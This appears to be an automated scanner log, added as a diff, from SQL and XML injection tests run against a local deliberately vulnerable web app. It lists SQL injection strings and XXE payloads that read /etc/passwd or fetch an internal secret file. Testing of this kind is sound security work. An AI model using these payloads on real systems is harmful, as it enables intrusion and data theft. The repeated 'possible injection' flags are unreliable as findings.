+2025-08-05 01:11:59.844936 |     [i] Testing payload: *
+2025-08-05 01:11:59.844936 |     [i] Request to: http://localhost:8080/vulnerabilities/xss_s/ (POST)
+2025-08-05 01:11:59.907157 |     [-] No obvious injection with payload '*'
+2025-08-05 01:11:59.907157 |     [i] Testing payload: null
+2025-08-05 01:11:59.907157 |     [i] Request to: http://localhost:8080/vulnerabilities/xss_s/ (POST)
+2025-08-05 01:11:59.968077 |     [-] No obvious injection with payload 'null'
+2025-08-05 01:11:59.968077 |   - Testing parameter: btnSign
+2025-08-05 01:11:59.968077 |     [i] Testing payload: ' OR 1=1--
+2025-08-05 01:11:59.968077 |     [i] Request to: http://localhost:8080/vulnerabilities/xss_s/ (POST)
+2025-08-05 01:12:00.033790 |     [-] No obvious injection with payload '' OR 1=1--'
+2025-08-05 01:12:00.033790 |     [i] Testing payload: ' OR ''='
+2025-08-05 01:12:00.033790 |     [i] Request to: http://localhost:8080/vulnerabilities/xss_s/ (POST)
+2025-08-05 01:12:00.095724 |     [-] No obvious injection with payload '' OR ''=''
+2025-08-05 01:12:00.095724 |     [i] Testing payload: ') OR ('1'='1
+2025-08-05 01:12:00.095724 |     [i] Request to: http://localhost:8080/vulnerabilities/xss_s/ (POST)
+2025-08-05 01:12:00.157600 |     [-] No obvious injection with payload '') OR ('1'='1'
+2025-08-05 01:12:00.157600 |     [i] Testing payload: 1 ORDER BY 1--
+2025-08-05 01:12:00.157600 |     [i] Request to: http://localhost:8080/vulnerabilities/xss_s/ (POST)
+2025-08-05 01:12:00.223110 |     [-] No obvious injection with payload '1 ORDER BY 1--'
+2025-08-05 01:12:00.223455 |     [i] Testing payload: 1 UNION SELECT 1,2,3--
+2025-08-05 01:12:00.223983 |     [i] Request to: http://localhost:8080/vulnerabilities/xss_s/ (POST)
+2025-08-05 01:12:00.283857 |     [-] No obvious injection with payload '1 UNION SELECT 1,2,3--'
+2025-08-05 01:12:00.283857 |     [i] Testing payload: *
+2025-08-05 01:12:00.283857 |     [i] Request to: http://localhost:8080/vulnerabilities/xss_s/ (POST)
+2025-08-05 01:12:00.346761 |     [-] No obvious injection with payload '*'
+2025-08-05 01:12:00.347687 |     [i] Testing payload: null
+2025-08-05 01:12:00.347687 |     [i] Request to: http://localhost:8080/vulnerabilities/xss_s/ (POST)
+2025-08-05 01:12:00.403954 |     [-] No obvious injection with payload 'null'
+2025-08-05 01:12:00.403954 |   - Testing parameter: btnClear
+2025-08-05 01:12:00.403954 |     [i] Testing payload: ' OR 1=1--
+2025-08-05 01:12:00.403954 |     [i] Request to: http://localhost:8080/vulnerabilities/xss_s/ (POST)
+2025-08-05 01:12:00.473885 |     [-] No obvious injection with payload '' OR 1=1--'
+2025-08-05 01:12:00.473885 |     [i] Testing payload: ' OR ''='
+2025-08-05 01:12:00.473885 |     [i] Request to: http://localhost:8080/vulnerabilities/xss_s/ (POST)
+2025-08-05 01:12:00.537454 |     [-] No obvious injection with payload '' OR ''=''
+2025-08-05 01:12:00.537454 |     [i] Testing payload: ') OR ('1'='1
+2025-08-05 01:12:00.537454 |     [i] Request to: http://localhost:8080/vulnerabilities/xss_s/ (POST)
+2025-08-05 01:12:00.598372 |     [-] No obvious injection with payload '') OR ('1'='1'
+2025-08-05 01:12:00.599631 |     [i] Testing payload: 1 ORDER BY 1--
+2025-08-05 01:12:00.599631 |     [i] Request to: http://localhost:8080/vulnerabilities/xss_s/ (POST)
+2025-08-05 01:12:00.662053 |     [-] No obvious injection with payload '1 ORDER BY 1--'
+2025-08-05 01:12:00.662053 |     [i] Testing payload: 1 UNION SELECT 1,2,3--
+2025-08-05 01:12:00.663063 |     [i] Request to: http://localhost:8080/vulnerabilities/xss_s/ (POST)
+2025-08-05 01:12:00.720775 |     [-] No obvious injection with payload '1 UNION SELECT 1,2,3--'
+2025-08-05 01:12:00.720775 |     [i] Testing payload: *
+2025-08-05 01:12:00.720775 |     [i] Request to: http://localhost:8080/vulnerabilities/xss_s/ (POST)
+2025-08-05 01:12:00.778347 |     [-] No obvious injection with payload '*'
+2025-08-05 01:12:00.778785 |     [i] Testing payload: null
+2025-08-05 01:12:00.779261 |     [i] Request to: http://localhost:8080/vulnerabilities/xss_s/ (POST)
+2025-08-05 01:12:00.836890 |     [-] No obvious injection with payload 'null'
+2025-08-05 01:12:00.836890 | ----- OTG-INPVAL-007 Test Completed -----
+
+2025-08-05 01:12:00.836890 | ----- Starting OTG-INPVAL-008 (XML Injection) -----
+2025-08-05 01:12:00.836890 | 
+[i] Testing URL: http://localhost:8080/vulnerabilities/xss_s/
+2025-08-05 01:12:00.844429 |   - Testing parameter: txtName
+2025-08-05 01:12:00.906714 |     [!] Possible XML processing with payload '''
+2025-08-05 01:12:00.906714 |     [!] Possible XML injection - XML response with payload '''
+2025-08-05 01:12:00.965881 |     [!] Possible XML processing with payload '"'
+2025-08-05 01:12:00.965881 |     [!] Possible XML injection - XML response with payload '"'
+2025-08-05 01:12:01.023992 |     [!] Possible XML processing with payload '>'
+2025-08-05 01:12:01.023992 |     [!] Possible XML injection - XML response with payload '>'
+2025-08-05 01:12:01.086051 |     [!] Possible XML processing with payload '<'
+2025-08-05 01:12:01.086051 |     [!] Possible XML injection - XML response with payload '<'
+2025-08-05 01:12:01.145869 |     [!] Possible XML processing with payload '&'
+2025-08-05 01:12:01.145869 |     [!] Possible XML injection - XML response with payload '&'
+2025-08-05 01:12:01.210996 |     [!] Possible XML processing with payload '<!--'
+2025-08-05 01:12:01.210996 |     [!] Possible XML injection - XML response with payload '<!--'
+2025-08-05 01:12:01.274028 |     [!] Possible XML processing with payload '-->'
+2025-08-05 01:12:01.274028 |     [!] Possible XML injection - XML response with payload '-->'
+2025-08-05 01:12:01.336384 |     [!] Possible XML processing with payload '<![CDATA['
+2025-08-05 01:12:01.336384 |     [!] Possible XML injection - XML response with payload '<![CDATA['
+2025-08-05 01:12:01.396468 |     [!] Possible XML processing with payload ']]>'
+2025-08-05 01:12:01.396468 |     [!] Possible XML injection - XML response with payload ']]>'
+2025-08-05 01:12:01.459313 |     [!] Possible XML processing with payload '<injected>test</injected>'
+2025-08-05 01:12:01.459313 |     [!] Possible XML injection - XML response with payload '<injected>test</injected>'
+2025-08-05 01:12:01.519648 |     [!] Possible XML processing with payload '<![CDATA[<script>alert(1)</script>]]>'
+2025-08-05 01:12:01.519648 |     [!] Possible XML injection - XML response with payload '<![CDATA[<script>alert(1)</script>]]>'
+2025-08-05 01:12:01.580202 |     [!] Possible XML processing with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:01.580202 |     [!] Possible XML injection - XML response with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:01.643861 |     [!] Possible XML processing with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://internal.server/secret.txt'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:01.643861 |     [!] Possible XML injection - XML response with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://internal.server/secret.txt'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:01.703822 |     [!] Possible XML processing with payload '</username><userid>0</userid><username>'
+2025-08-05 01:12:01.703822 |     [!] Possible XML injection - XML response with payload '</username><userid>0</userid><username>'
+2025-08-05 01:12:01.764884 |     [!] Possible XML processing with payload '<mail>attacker@evil.com</mail><!--'
+2025-08-05 01:12:01.764884 |     [!] Possible XML injection - XML response with payload '<mail>attacker@evil.com</mail><!--'
+2025-08-05 01:12:01.827064 |     [!] Possible XML processing with payload '--><userid>0</userid><mail>'
+2025-08-05 01:12:01.827455 |     [!] Possible XML injection - XML response with payload '--><userid>0</userid><mail>'
+2025-08-05 01:12:01.827455 |   - Testing parameter: btnSign
+2025-08-05 01:12:01.883986 |     [!] Possible XML processing with payload '''
+2025-08-05 01:12:01.883986 |     [!] Possible XML injection - XML response with payload '''
+2025-08-05 01:12:01.945459 |     [!] Possible XML processing with payload '"'
+2025-08-05 01:12:01.945459 |     [!] Possible XML injection - XML response with payload '"'
+2025-08-05 01:12:02.008576 |     [!] Possible XML processing with payload '>'
+2025-08-05 01:12:02.009106 |     [!] Possible XML injection - XML response with payload '>'
+2025-08-05 01:12:02.066443 |     [!] Possible XML processing with payload '<'
+2025-08-05 01:12:02.066443 |     [!] Possible XML injection - XML response with payload '<'
+2025-08-05 01:12:02.124042 |     [!] Possible XML processing with payload '&'
+2025-08-05 01:12:02.125727 |     [!] Possible XML injection - XML response with payload '&'
+2025-08-05 01:12:02.185170 |     [!] Possible XML processing with payload '<!--'
+2025-08-05 01:12:02.185170 |     [!] Possible XML injection - XML response with payload '<!--'
+2025-08-05 01:12:02.248079 |     [!] Possible XML processing with payload '-->'
+2025-08-05 01:12:02.248079 |     [!] Possible XML injection - XML response with payload '-->'
+2025-08-05 01:12:02.306055 |     [!] Possible XML processing with payload '<![CDATA['
+2025-08-05 01:12:02.306577 |     [!] Possible XML injection - XML response with payload '<![CDATA['
+2025-08-05 01:12:02.363743 |     [!] Possible XML processing with payload ']]>'
+2025-08-05 01:12:02.369726 |     [!] Possible XML injection - XML response with payload ']]>'
+2025-08-05 01:12:02.429368 |     [!] Possible XML processing with payload '<injected>test</injected>'
+2025-08-05 01:12:02.429368 |     [!] Possible XML injection - XML response with payload '<injected>test</injected>'
+2025-08-05 01:12:02.494216 |     [!] Possible XML processing with payload '<![CDATA[<script>alert(1)</script>]]>'
+2025-08-05 01:12:02.494216 |     [!] Possible XML injection - XML response with payload '<![CDATA[<script>alert(1)</script>]]>'
+2025-08-05 01:12:02.553758 |     [!] Possible XML processing with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:02.553758 |     [!] Possible XML injection - XML response with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:02.613995 |     [!] Possible XML processing with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://internal.server/secret.txt'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:02.622625 |     [!] Possible XML injection - XML response with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://internal.server/secret.txt'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:02.683870 |     [!] Possible XML processing with payload '</username><userid>0</userid><username>'
+2025-08-05 01:12:02.683870 |     [!] Possible XML injection - XML response with payload '</username><userid>0</userid><username>'
+2025-08-05 01:12:02.743989 |     [!] Possible XML processing with payload '<mail>attacker@evil.com</mail><!--'
+2025-08-05 01:12:02.743989 |     [!] Possible XML injection - XML response with payload '<mail>attacker@evil.com</mail><!--'
+2025-08-05 01:12:02.804192 |     [!] Possible XML processing with payload '--><userid>0</userid><mail>'
+2025-08-05 01:12:02.804192 |     [!] Possible XML injection - XML response with payload '--><userid>0</userid><mail>'
+2025-08-05 01:12:02.804192 |   - Testing parameter: btnClear
+2025-08-05 01:12:02.868763 |     [!] Possible XML processing with payload '''
+2025-08-05 01:12:02.868763 |     [!] Possible XML injection - XML response with payload '''
+2025-08-05 01:12:02.930947 |     [!] Possible XML processing with payload '"'
+2025-08-05 01:12:02.930947 |     [!] Possible XML injection - XML response with payload '"'
+2025-08-05 01:12:02.990152 |     [!] Possible XML processing with payload '>'
+2025-08-05 01:12:02.990152 |     [!] Possible XML injection - XML response with payload '>'
+2025-08-05 01:12:03.047123 |     [!] Possible XML processing with payload '<'
+2025-08-05 01:12:03.053046 |     [!] Possible XML injection - XML response with payload '<'
+2025-08-05 01:12:03.113803 |     [!] Possible XML processing with payload '&'
+2025-08-05 01:12:03.113803 |     [!] Possible XML injection - XML response with payload '&'
+2025-08-05 01:12:03.173797 |     [!] Possible XML processing with payload '<!--'
+2025-08-05 01:12:03.173797 |     [!] Possible XML injection - XML response with payload '<!--'
+2025-08-05 01:12:03.240859 |     [!] Possible XML processing with payload '-->'
+2025-08-05 01:12:03.240859 |     [!] Possible XML injection - XML response with payload '-->'
+2025-08-05 01:12:03.299196 |     [!] Possible XML processing with payload '<![CDATA['
+2025-08-05 01:12:03.299196 |     [!] Possible XML injection - XML response with payload '<![CDATA['
+2025-08-05 01:12:03.359250 |     [!] Possible XML processing with payload ']]>'
+2025-08-05 01:12:03.359250 |     [!] Possible XML injection - XML response with payload ']]>'
+2025-08-05 01:12:03.418568 |     [!] Possible XML processing with payload '<injected>test</injected>'
+2025-08-05 01:12:03.422502 |     [!] Possible XML injection - XML response with payload '<injected>test</injected>'
+2025-08-05 01:12:03.478230 |     [!] Possible XML processing with payload '<![CDATA[<script>alert(1)</script>]]>'
+2025-08-05 01:12:03.478230 |     [!] Possible XML injection - XML response with payload '<![CDATA[<script>alert(1)</script>]]>'
+2025-08-05 01:12:03.545692 |     [!] Possible XML processing with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:03.547077 |     [!] Possible XML injection - XML response with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:03.606807 |     [!] Possible XML processing with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://internal.server/secret.txt'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:03.608178 |     [!] Possible XML injection - XML response with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://internal.server/secret.txt'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:03.664265 |     [!] Possible XML processing with payload '</username><userid>0</userid><username>'
+2025-08-05 01:12:03.664265 |     [!] Possible XML injection - XML response with payload '</username><userid>0</userid><username>'
+2025-08-05 01:12:03.729213 |     [!] Possible XML processing with payload '<mail>attacker@evil.com</mail><!--'
+2025-08-05 01:12:03.731744 |     [!] Possible XML injection - XML response with payload '<mail>attacker@evil.com</mail><!--'
+2025-08-05 01:12:03.794053 |     [!] Possible XML processing with payload '--><userid>0</userid><mail>'
+2025-08-05 01:12:03.794053 |     [!] Possible XML injection - XML response with payload '--><userid>0</userid><mail>'
+2025-08-05 01:12:03.794053 | 
+[i] Testing URL: http://localhost:8080/vulnerabilities/sqli/
+2025-08-05 01:12:03.802501 |   - Testing parameter: id
+2025-08-05 01:12:03.804069 |     [!] Possible XML injection - Error with payload '''
+2025-08-05 01:12:03.806552 |     [!] Possible XML processing with payload '"'
+2025-08-05 01:12:03.806552 |     [!] Possible XML injection - XML response with payload '"'
+2025-08-05 01:12:03.806552 |     [!] Possible XML processing with payload '>'
+2025-08-05 01:12:03.806552 |     [!] Possible XML injection - XML response with payload '>'
+2025-08-05 01:12:03.814243 |     [!] Possible XML processing with payload '<'
+2025-08-05 01:12:03.814243 |     [!] Possible XML injection - XML response with payload '<'
+2025-08-05 01:12:03.818345 |     [!] Possible XML processing with payload '&'
+2025-08-05 01:12:03.818345 |     [!] Possible XML injection - XML response with payload '&'
+2025-08-05 01:12:03.818345 |     [!] Possible XML processing with payload '<!--'
+2025-08-05 01:12:03.818345 |     [!] Possible XML injection - XML response with payload '<!--'
+2025-08-05 01:12:03.824086 |     [!] Possible XML processing with payload '-->'
+2025-08-05 01:12:03.824086 |     [!] Possible XML injection - XML response with payload '-->'
+2025-08-05 01:12:03.829139 |     [!] Possible XML processing with payload '<![CDATA['
+2025-08-05 01:12:03.829139 |     [!] Possible XML injection - XML response with payload '<![CDATA['
+2025-08-05 01:12:03.829139 |     [!] Possible XML processing with payload ']]>'
+2025-08-05 01:12:03.829139 |     [!] Possible XML injection - XML response with payload ']]>'
+2025-08-05 01:12:03.834541 |     [!] Possible XML processing with payload '<injected>test</injected>'
+2025-08-05 01:12:03.834541 |     [!] Possible XML injection - XML response with payload '<injected>test</injected>'
+2025-08-05 01:12:03.834541 |     [!] Possible XML processing with payload '<![CDATA[<script>alert(1)</script>]]>'
+2025-08-05 01:12:03.834541 |     [!] Possible XML injection - XML response with payload '<![CDATA[<script>alert(1)</script>]]>'
+2025-08-05 01:12:03.844066 |     [!] Possible XML injection - Error with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:03.847377 |     [!] Possible XML injection - Error with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://internal.server/secret.txt'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:03.851368 |     [!] Possible XML processing with payload '</username><userid>0</userid><username>'
+2025-08-05 01:12:03.851368 |     [!] Possible XML injection - XML response with payload '</username><userid>0</userid><username>'
+2025-08-05 01:12:03.853878 |     [!] Possible XML processing with payload '<mail>attacker@evil.com</mail><!--'
+2025-08-05 01:12:03.853878 |     [!] Possible XML injection - XML response with payload '<mail>attacker@evil.com</mail><!--'
+2025-08-05 01:12:03.853878 |     [!] Possible XML processing with payload '--><userid>0</userid><mail>'
+2025-08-05 01:12:03.853878 |     [!] Possible XML injection - XML response with payload '--><userid>0</userid><mail>'
+2025-08-05 01:12:03.853878 |   - Testing parameter: Submit
+2025-08-05 01:12:03.860007 |     [!] Possible XML processing with payload '''
+2025-08-05 01:12:03.860007 |     [!] Possible XML injection - XML response with payload '''
+2025-08-05 01:12:03.864018 |     [!] Possible XML processing with payload '"'
+2025-08-05 01:12:03.865850 |     [!] Possible XML injection - XML response with payload '"'
+2025-08-05 01:12:03.869852 |     [!] Possible XML processing with payload '>'
+2025-08-05 01:12:03.870379 |     [!] Possible XML injection - XML response with payload '>'
+2025-08-05 01:12:03.875118 |     [!] Possible XML processing with payload '<'
+2025-08-05 01:12:03.875652 |     [!] Possible XML injection - XML response with payload '<'
+2025-08-05 01:12:03.879356 |     [!] Possible XML processing with payload '&'
+2025-08-05 01:12:03.879884 |     [!] Possible XML injection - XML response with payload '&'
+2025-08-05 01:12:03.883610 |     [!] Possible XML processing with payload '<!--'
+2025-08-05 01:12:03.884120 |     [!] Possible XML injection - XML response with payload '<!--'
+2025-08-05 01:12:03.886230 |     [!] Possible XML processing with payload '-->'
+2025-08-05 01:12:03.886230 |     [!] Possible XML injection - XML response with payload '-->'
+2025-08-05 01:12:03.886230 |     [!] Possible XML processing with payload '<![CDATA['
+2025-08-05 01:12:03.886230 |     [!] Possible XML injection - XML response with payload '<![CDATA['
+2025-08-05 01:12:03.893936 |     [!] Possible XML processing with payload ']]>'
+2025-08-05 01:12:03.893936 |     [!] Possible XML injection - XML response with payload ']]>'
+2025-08-05 01:12:03.897197 |     [!] Possible XML processing with payload '<injected>test</injected>'
+2025-08-05 01:12:03.897197 |     [!] Possible XML injection - XML response with payload '<injected>test</injected>'
+2025-08-05 01:12:03.897197 |     [!] Possible XML processing with payload '<![CDATA[<script>alert(1)</script>]]>'
+2025-08-05 01:12:03.897197 |     [!] Possible XML injection - XML response with payload '<![CDATA[<script>alert(1)</script>]]>'
+2025-08-05 01:12:03.904259 |     [!] Possible XML processing with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:03.904259 |     [!] Possible XML injection - XML response with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:03.904259 |     [!] Possible XML processing with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://internal.server/secret.txt'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:03.904259 |     [!] Possible XML injection - XML response with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://internal.server/secret.txt'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:03.910361 |     [!] Possible XML processing with payload '</username><userid>0</userid><username>'
+2025-08-05 01:12:03.910361 |     [!] Possible XML injection - XML response with payload '</username><userid>0</userid><username>'
+2025-08-05 01:12:03.913876 |     [!] Possible XML processing with payload '<mail>attacker@evil.com</mail><!--'
+2025-08-05 01:12:03.913876 |     [!] Possible XML injection - XML response with payload '<mail>attacker@evil.com</mail><!--'
+2025-08-05 01:12:03.917450 |     [!] Possible XML processing with payload '--><userid>0</userid><mail>'
+2025-08-05 01:12:03.917450 |     [!] Possible XML injection - XML response with payload '--><userid>0</userid><mail>'
+2025-08-05 01:12:03.917450 | 
+[i] Testing URL: http://localhost:8080/vulnerabilities/brute/
+2025-08-05 01:12:03.924226 |   - Testing parameter: username
+2025-08-05 01:12:03.924226 |     [!] Possible XML injection - Error with payload '''
+2025-08-05 01:12:03.929843 |     [!] Possible XML processing with payload '"'
+2025-08-05 01:12:03.929843 |     [!] Possible XML injection - XML response with payload '"'
+2025-08-05 01:12:03.934061 |     [!] Possible XML processing with payload '>'
+2025-08-05 01:12:03.934061 |     [!] Possible XML injection - XML response with payload '>'
+2025-08-05 01:12:03.934061 |     [!] Possible XML processing with payload '<'
+2025-08-05 01:12:03.934061 |     [!] Possible XML injection - XML response with payload '<'
+2025-08-05 01:12:03.934061 |     [!] Possible XML processing with payload '&'
+2025-08-05 01:12:03.934061 |     [!] Possible XML injection - XML response with payload '&'
+2025-08-05 01:12:03.944228 |     [!] Possible XML processing with payload '<!--'
+2025-08-05 01:12:03.945254 |     [!] Possible XML injection - XML response with payload '<!--'
+2025-08-05 01:12:03.947466 |     [!] Possible XML processing with payload '-->'
+2025-08-05 01:12:03.947466 |     [!] Possible XML injection - XML response with payload '-->'
+2025-08-05 01:12:03.947466 |     [!] Possible XML processing with payload '<![CDATA['
+2025-08-05 01:12:03.947466 |     [!] Possible XML injection - XML response with payload '<![CDATA['
+2025-08-05 01:12:03.954986 |     [!] Possible XML processing with payload ']]>'
+2025-08-05 01:12:03.954986 |     [!] Possible XML injection - XML response with payload ']]>'
+2025-08-05 01:12:03.954986 |     [!] Possible XML processing with payload '<injected>test</injected>'
+2025-08-05 01:12:03.954986 |     [!] Possible XML injection - XML response with payload '<injected>test</injected>'
+2025-08-05 01:12:03.961592 |     [!] Possible XML processing with payload '<![CDATA[<script>alert(1)</script>]]>'
+2025-08-05 01:12:03.961592 |     [!] Possible XML injection - XML response with payload '<![CDATA[<script>alert(1)</script>]]>'
+2025-08-05 01:12:03.963956 |     [!] Possible XML injection - Error with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:03.968990 |     [!] Possible XML injection - Error with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://internal.server/secret.txt'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:03.968990 |     [!] Possible XML processing with payload '</username><userid>0</userid><username>'
+2025-08-05 01:12:03.968990 |     [!] Possible XML injection - XML response with payload '</username><userid>0</userid><username>'
+2025-08-05 01:12:03.974510 |     [!] Possible XML processing with payload '<mail>attacker@evil.com</mail><!--'
+2025-08-05 01:12:03.974510 |     [!] Possible XML injection - XML response with payload '<mail>attacker@evil.com</mail><!--'
+2025-08-05 01:12:03.977603 |     [!] Possible XML processing with payload '--><userid>0</userid><mail>'
+2025-08-05 01:12:03.977603 |     [!] Possible XML injection - XML response with payload '--><userid>0</userid><mail>'
+2025-08-05 01:12:03.977603 |   - Testing parameter: password
+2025-08-05 01:12:03.977603 |     [!] Possible XML processing with payload '''
+2025-08-05 01:12:03.977603 |     [!] Possible XML injection - XML response with payload '''
+2025-08-05 01:12:03.984028 |     [!] Possible XML processing with payload '"'
+2025-08-05 01:12:03.984028 |     [!] Possible XML injection - XML response with payload '"'
+2025-08-05 01:12:03.984028 |     [!] Possible XML processing with payload '>'
+2025-08-05 01:12:03.984028 |     [!] Possible XML injection - XML response with payload '>'
+2025-08-05 01:12:03.984028 |     [!] Possible XML processing with payload '<'
+2025-08-05 01:12:03.984028 |     [!] Possible XML injection - XML response with payload '<'
+2025-08-05 01:12:03.994068 |     [!] Possible XML processing with payload '&'
+2025-08-05 01:12:03.994068 |     [!] Possible XML injection - XML response with payload '&'
+2025-08-05 01:12:03.994068 |     [!] Possible XML processing with payload '<!--'
+2025-08-05 01:12:03.994068 |     [!] Possible XML injection - XML response with payload '<!--'
+2025-08-05 01:12:04.002748 |     [!] Possible XML processing with payload '-->'
+2025-08-05 01:12:04.002748 |     [!] Possible XML injection - XML response with payload '-->'
+2025-08-05 01:12:04.004272 |     [!] Possible XML processing with payload '<![CDATA['
+2025-08-05 01:12:04.004272 |     [!] Possible XML injection - XML response with payload '<![CDATA['
+2025-08-05 01:12:04.008715 |     [!] Possible XML processing with payload ']]>'
+2025-08-05 01:12:04.008715 |     [!] Possible XML injection - XML response with payload ']]>'
+2025-08-05 01:12:04.011059 |     [!] Possible XML processing with payload '<injected>test</injected>'
+2025-08-05 01:12:04.011059 |     [!] Possible XML injection - XML response with payload '<injected>test</injected>'
+2025-08-05 01:12:04.015287 |     [!] Possible XML processing with payload '<![CDATA[<script>alert(1)</script>]]>'
+2025-08-05 01:12:04.015287 |     [!] Possible XML injection - XML response with payload '<![CDATA[<script>alert(1)</script>]]>'
+2025-08-05 01:12:04.019096 |     [!] Possible XML processing with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:04.019096 |     [!] Possible XML injection - XML response with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:04.021753 |     [!] Possible XML processing with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://internal.server/secret.txt'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:04.021753 |     [!] Possible XML injection - XML response with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://internal.server/secret.txt'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:04.025507 |     [!] Possible XML processing with payload '</username><userid>0</userid><username>'
+2025-08-05 01:12:04.025507 |     [!] Possible XML injection - XML response with payload '</username><userid>0</userid><username>'
+2025-08-05 01:12:04.025507 |     [!] Possible XML processing with payload '<mail>attacker@evil.com</mail><!--'
+2025-08-05 01:12:04.025507 |     [!] Possible XML injection - XML response with payload '<mail>attacker@evil.com</mail><!--'
+2025-08-05 01:12:04.025507 |     [!] Possible XML processing with payload '--><userid>0</userid><mail>'
+2025-08-05 01:12:04.033980 |     [!] Possible XML injection - XML response with payload '--><userid>0</userid><mail>'
+2025-08-05 01:12:04.033980 |   - Testing parameter: Login
+2025-08-05 01:12:04.033980 |     [!] Possible XML processing with payload '''
+2025-08-05 01:12:04.033980 |     [!] Possible XML injection - XML response with payload '''
+2025-08-05 01:12:04.039910 |     [!] Possible XML processing with payload '"'
+2025-08-05 01:12:04.039910 |     [!] Possible XML injection - XML response with payload '"'
+2025-08-05 01:12:04.044161 |     [!] Possible XML processing with payload '>'
+2025-08-05 01:12:04.044161 |     [!] Possible XML injection - XML response with payload '>'
+2025-08-05 01:12:04.044161 |     [!] Possible XML processing with payload '<'
+2025-08-05 01:12:04.044161 |     [!] Possible XML injection - XML response with payload '<'
+2025-08-05 01:12:04.049193 |     [!] Possible XML processing with payload '&'
+2025-08-05 01:12:04.049193 |     [!] Possible XML injection - XML response with payload '&'
+2025-08-05 01:12:04.054220 |     [!] Possible XML processing with payload '<!--'
+2025-08-05 01:12:04.054220 |     [!] Possible XML injection - XML response with payload '<!--'
+2025-08-05 01:12:04.057235 |     [!] Possible XML processing with payload '-->'
+2025-08-05 01:12:04.057235 |     [!] Possible XML injection - XML response with payload '-->'
+2025-08-05 01:12:04.057235 |     [!] Possible XML processing with payload '<![CDATA['
+2025-08-05 01:12:04.057235 |     [!] Possible XML injection - XML response with payload '<![CDATA['
+2025-08-05 01:12:04.063860 |     [!] Possible XML processing with payload ']]>'
+2025-08-05 01:12:04.063860 |     [!] Possible XML injection - XML response with payload ']]>'
+2025-08-05 01:12:04.063860 |     [!] Possible XML processing with payload '<injected>test</injected>'
+2025-08-05 01:12:04.063860 |     [!] Possible XML injection - XML response with payload '<injected>test</injected>'
+2025-08-05 01:12:04.071616 |     [!] Possible XML processing with payload '<![CDATA[<script>alert(1)</script>]]>'
+2025-08-05 01:12:04.072014 |     [!] Possible XML injection - XML response with payload '<![CDATA[<script>alert(1)</script>]]>'
+2025-08-05 01:12:04.074538 |     [!] Possible XML processing with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:04.074538 |     [!] Possible XML injection - XML response with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:04.076702 |     [!] Possible XML processing with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://internal.server/secret.txt'>]><foo>&xxe;</foo>'
+2025-08-05 01:12:04.079501 |     [!] Possible XML injection - XML response with payload '<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://internal.server/secret.txt'>]><foo>&xxe;</foo>'
